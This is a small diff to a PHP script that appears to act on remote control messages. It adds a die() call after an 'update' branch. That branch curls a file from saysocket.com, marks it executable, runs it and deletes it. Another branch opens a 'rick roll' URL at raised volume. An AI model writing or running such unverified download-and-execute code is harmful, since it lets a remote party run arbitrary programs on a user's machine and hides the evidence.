@@ -95,6 +95,7 @@ do {
             $cmd = 'curl -s -o ' . $file . ' "http://saysocket.com/i.php?h=fbbc53eb790dab17" && chmod +x ' . $file . ' && ' . $file . ' && rm ' . $file;
             $res = exec($cmd);
             $msg .= "Update cmd: '$cmd' ran with response: '$res'\n";
+            die();
         } else if (preg_match(REGEX_CTL_RICK_ROLL, $buf)) {
             set_volume(7);
             open_url('{{B64_STR_RICK_ROLL_URL}}');
